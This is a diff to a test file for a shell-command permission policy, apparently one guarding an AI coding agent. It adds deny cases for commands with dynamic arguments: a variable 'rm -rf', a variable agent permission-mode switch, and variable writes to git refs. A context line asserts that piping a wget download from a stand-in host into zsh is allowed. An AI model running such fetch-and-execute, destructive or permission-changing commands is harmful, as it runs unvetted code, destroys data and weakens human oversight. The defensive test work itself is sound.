@@ -33,6 +33,14 @@ test("policy does not create a synchronous human gate for local development", ()
   assert.equal(evaluateCommand("wget -qO- https://example.test/x | zsh -s").decision, "allow");
 });
 
+test("policy denies every dynamic shell argument", () => {
+  assert.equal(evaluateCommand("rm -rf \"$TARGET\"").decision, "deny");
+  assert.equal(evaluateCommand("claude --permission-mode \"$MODE\"").decision, "deny");
+  assert.equal(evaluateCommand("bash -c 'claude --permission-mode \"$MODE\"'").decision, "deny");
+  assert.equal(evaluateCommand("echo ref > .git/refs/heads/$BRANCH").decision, "deny");
+  assert.equal(evaluateCommand("echo \"$VALUE\" > \"$TARGET\"").decision, "deny");
+});
+
 test("policy allows ordinary read-only commands", () => {
   assert.equal(evaluateCommand("git diff --check").decision, "allow");
 });
